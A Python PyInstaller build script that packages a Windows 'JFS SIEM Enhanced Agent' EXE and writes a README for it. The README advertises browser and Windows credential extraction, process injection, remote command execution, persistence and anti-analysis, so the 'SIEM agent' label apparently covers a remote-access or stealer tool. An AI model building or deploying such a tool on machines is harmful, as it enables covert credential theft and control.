#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Build Enhanced JFS SIEM Agent EXE
Creates a single EXE file with all dependencies bundled
"""

import os
import sys
import subprocess
import shutil
from pathlib import Path

# Fix encoding for Windows console
if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

def build_enhanced_exe():
    """Build enhanced agent EXE with PyInstaller"""
    
    script_dir = Path(__file__).parent
    agent_script = script_dir / "jfs_agent_enhanced.py"
    dist_dir = script_dir / "dist_enhanced"
    build_dir = script_dir / "build_enhanced"
    
    print("="*70)
    print("JFS SIEM Enhanced Agent - EXE Builder")
    print("="*70)
    
    # Check if agent script exists
    if not agent_script.exists():
        print(f"✗ Error: {agent_script} not found")
        return False
    
    print(f"\n✓ Agent script found: {agent_script}")
    
    # Check if PyInstaller is installed
    try:
        import PyInstaller
        print(f"✓ PyInstaller installed: {PyInstaller.__version__}")
    except ImportError:
        print("✗ PyInstaller not installed")
        print("Installing PyInstaller...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
    
    # Clean previous builds
    print("\nCleaning previous builds...")
    for dir_path in [build_dir, dist_dir]:
        if dir_path.exists():
            try:
                shutil.rmtree(dir_path, ignore_errors=True)
                print(f"✓ Removed: {dir_path}")
            except:
                print(f"⚠ Could not remove: {dir_path}")
    
    # Build command
    print("\nBuilding enhanced agent EXE...")
    print("-" * 70)
    
    cmd = [
        sys.executable,
        "-m", "PyInstaller",
        "--onefile",
        "--console",
        "--name", "JFS_SIEM_Agent_Enhanced",
        "--hidden-import=win32evtlog",
        "--hidden-import=win32con",
        "--hidden-import=win32service",
        "--hidden-import=win32event",
        "--hidden-import=servicemanager",
        "--hidden-import=win32serviceutil",
        "--hidden-import=tkinter",
        "--hidden-import=tkinter.ttk",
        "--hidden-import=PIL",
        "--hidden-import=PIL.Image",
        "--hidden-import=PIL.ImageGrab",
        "--hidden-import=pyautogui",
        "--hidden-import=psutil",
        "--hidden-import=cryptography",
        "--hidden-import=requests",
        "--collect-all=pywin32",
        "--collect-all=tkinter",
        "--collect-submodules=tkinter",
        "--distpath", str(dist_dir),
        "--workpath", str(build_dir),
        "--specpath", str(script_dir),
        "--noupx",
        str(agent_script)
    ]
    
    try:
        result = subprocess.run(cmd, check=True, capture_output=False)
        print("-" * 70)
        print("✓ Build completed successfully!")
    except subprocess.CalledProcessError as e:
        print(f"✗ Build failed: {e}")
        return False
    
    # Check if EXE was created
    exe_path = dist_dir / "JFS_SIEM_Agent_Enhanced.exe"
    if exe_path.exists():
        exe_size = exe_path.stat().st_size / (1024 * 1024)
        print(f"\n✓ EXE created successfully!")
        print(f"  Location: {exe_path}")
        print(f"  Size: {exe_size:.1f} MB")
        
        # Create deployment package
        print("\nCreating deployment package...")
        package_dir = script_dir / "JFS_SIEM_Agent_Enhanced_Package"
        
        if package_dir.exists():
            try:
                shutil.rmtree(package_dir)
            except PermissionError:
                print(f"⚠ Could not remove old package, will overwrite files")
        
        package_dir.mkdir(exist_ok=True)
        
        # Copy EXE
        try:
            dest_exe = package_dir / "JFS_SIEM_Agent_Enhanced.exe"
            if dest_exe.exists():
                dest_exe.unlink()
            shutil.copy(exe_path, dest_exe)
            print(f"✓ Copied EXE to: {package_dir}")
        except Exception as e:
            print(f"⚠ Could not copy EXE: {e}")
        
        # Create README
        readme_content = """# JFS SIEM Enhanced Agent - Deployment Package

## What's Included
- JFS_SIEM_Agent_Enhanced.exe - Complete agent with all advanced features

## Features
✓ 82+ Advanced Security Features
✓ Credential Extraction (Chrome, Firefox, Windows)
✓ Process Injection & Monitoring
✓ Remote Command Execution
✓ Screenshot Capture
✓ File Operations
✓ System Information
✓ Network Reconnaissance
✓ Persistence Mechanisms
✓ Anti-Analysis Detection
✓ And much more...

## Installation

### Quick Start
1. Double-click JFS_SIEM_Agent_Enhanced.exe
2. Configure collector IP and port in GUI
3. Click "Install Service"
4. Click "Start Service"

### Manual Service Installation
```
JFS_SIEM_Agent_Enhanced.exe install
JFS_SIEM_Agent_Enhanced.exe start
```

## Configuration
Default settings:
- Collector IP: 192.168.1.100
- Collector Port: 9999

Change via GUI or edit agent_config.json

## Service Management

Start: `JFS_SIEM_Agent_Enhanced.exe start`
Stop: `JFS_SIEM_Agent_Enhanced.exe stop`
Remove: `JFS_SIEM_Agent_Enhanced.exe remove`
Status: `Get-Service JFSSIEMAgent`

## Logs
Location: %APPDATA%\\JFS_SIEM_Agent\\logs\\

## Version
JFS SIEM Enhanced Agent v7.0
Build Date: """ + str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + """
"""
        
        with open(package_dir / "README.txt", "w", encoding='utf-8') as f:
            f.write(readme_content)
        print(f"✓ Created README.txt")
        
        print(f"\n✓ Deployment package created: {package_dir}")
        print("\nPackage contents:")
        for file in package_dir.iterdir():
            size = file.stat().st_size
            if size > 1024 * 1024:
                size_str = f"{size / (1024*1024):.1f} MB"
            elif size > 1024:
                size_str = f"{size / 1024:.1f} KB"
            else:
                size_str = f"{size} bytes"
            print(f"  - {file.name} ({size_str})")
        
        print("\n" + "="*70)
        print("✓ BUILD COMPLETE!")
        print("="*70)
        print(f"\nReady to deploy: {package_dir}")
        print("\n" + "="*70)
        
        return True
    else:
        print(f"✗ EXE not found at: {exe_path}")
        return False

if __name__ == "__main__":
    from datetime import datetime
    success = build_enhanced_exe()
    sys.exit(0 if success else 1)
